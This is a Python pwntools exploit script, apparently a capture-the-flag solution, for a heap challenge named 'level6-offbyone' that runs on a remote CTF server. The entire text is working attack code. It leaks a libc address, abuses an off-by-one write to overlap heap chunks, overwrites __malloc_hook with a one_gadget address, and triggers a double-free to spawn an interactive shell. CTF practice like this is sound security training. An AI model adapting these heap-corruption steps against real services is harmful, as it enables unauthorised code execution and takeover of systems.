from pwn import *
context.log_level = "debug"

#r = process("./level6-offbyone")
r = remote("pwn.sixstars.team", 22506)
elf = ELF("./level6-offbyone")
libc = ELF("./libc.so.6")

def add(size, data):
    r.sendlineafter(">> ", "1")
    r.sendlineafter("Size:", str(size))
    r.sendafter("Content:", data)

def add_line(size, data):
    r.sendlineafter(">> ", "1")
    r.sendlineafter("Size:", str(size))
    r.sendlineafter("Content:", data)

def show(index):
    r.sendlineafter(">> ", "2")
    r.sendlineafter("id:", str(index))

def edit(index, data):
    r.sendlineafter(">> ", "3")
    r.sendlineafter("id:", str(index))
    r.sendafter("Content:", data)

def dele(index):
    r.sendlineafter(">> ", "4")
    r.sendlineafter("id:", str(index))

# leak libc address

add_line(0x100, 'a')
add_line(0x100, 'a')
dele(0)
add(0x8, 'a'*8)
show(0)

r.recv(8)
a = u64(r.recv(6)+'\x00\x00') - 0x3c4c78
print hex(a)
libc.address = a

dele(0)
dele(1)


# get ready to change __malloc_hook to one_gadget

add(0x18, 'a'*0x18)
add_line(0x68, 'a')
add_line(0x68, p64(libc.sym['__malloc_hook'] - 0x13))
add_line(0x28, 'a')
edit(0, 'a'*0x10+p64(0)+'\xe1')

dele(2)
dele(1)

x = libc.sym['__malloc_hook'] - 0x13
add_line(0xd8, p64(0)*6*2+p64(0)+p64(0x71)+p64(x))
add_line(0x68, 'a')

# create heap to double-free

add(0x18, 'b'*0x18)
add_line(0x58, 'b')
add_line(0x58, 'b')
add_line(0x28, 'c')
edit(4, 'b'*0x10+p64(0)+'\xc1')
dele(5)
add_line(0x58, 'b')
add_line(0x58, 'b')

# change __malloc_hook

add_line(0x68, 'a'*3+p64(a+0xf02a4))

# double-free

dele(6)
dele(8)

r.interactive()
